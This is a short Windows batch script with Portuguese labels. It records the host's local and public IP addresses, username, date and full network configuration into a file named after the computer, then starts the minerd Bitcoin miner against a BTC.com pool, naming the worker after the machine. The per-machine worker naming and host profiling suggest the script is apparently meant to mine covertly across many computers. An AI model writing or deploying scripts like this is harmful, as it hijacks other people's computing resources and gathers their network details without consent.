
@echo off
:CONFIG
:CONFIG_IP_LOCAL
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "IPv4"') do set ip=%%b
set ip=%ip:~1%
:CONFIG_IP_PUBLICO
for /f "tokens=2 delims=: " %%A in (
  'nslookup myip.opendns.com. resolver1.opendns.com 2^>NUL^|find "Address:"'
) Do set ExtIP=%%A

:OUTPUT
ECHO ////// INFORMAÇÕES DO COMPUTADOR ////// > "%ComputerName%.txt"
echo. >> "%ComputerName%.txt"
echo DATA:%date% >> "%ComputerName%.txt"
ECHO HORA:%time% >> "%ComputerName%.txt"
echo Usuario: %USERNAME% >> "%ComputerName%.txt"
echo IP EXTERNO: %ExtIP% >> "%ComputerName%.txt"
ipconfig /all >> "%ComputerName%.txt"


:MINER
minerd -o stratum+tcp://us.ss.btc.com:1800 -a sha256d -u coalito.%computername% -t 1 -r 20
pause